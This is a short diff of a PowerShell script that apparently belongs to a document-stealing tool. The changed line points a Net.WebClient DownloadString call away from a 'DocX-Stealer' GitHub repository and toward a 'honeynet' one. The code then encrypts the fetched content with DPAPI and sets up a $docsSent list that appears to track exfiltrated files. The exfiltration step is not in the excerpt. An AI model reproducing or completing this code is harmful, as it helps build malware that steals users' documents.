@@ -2,7 +2,7 @@ Add-Type -AssemblyName System.Security
 
 
 ##### GLOBAL #####
-$Content = (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/wolf0x/DocX-Stealer/master/gcse2020')
+$Content = (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/wolf0x/honeynet/master/gcse2020')
 [string[]]$Bytes = $Content.Split("`n")
 $ContentX = [Security.Cryptography.ProtectedData]::Protect($Bytes, $Null, [Security.Cryptography.DataProtectionScope]::LocalMachine)
 $docsSent =  New-Object Collections.Generic.List[String]
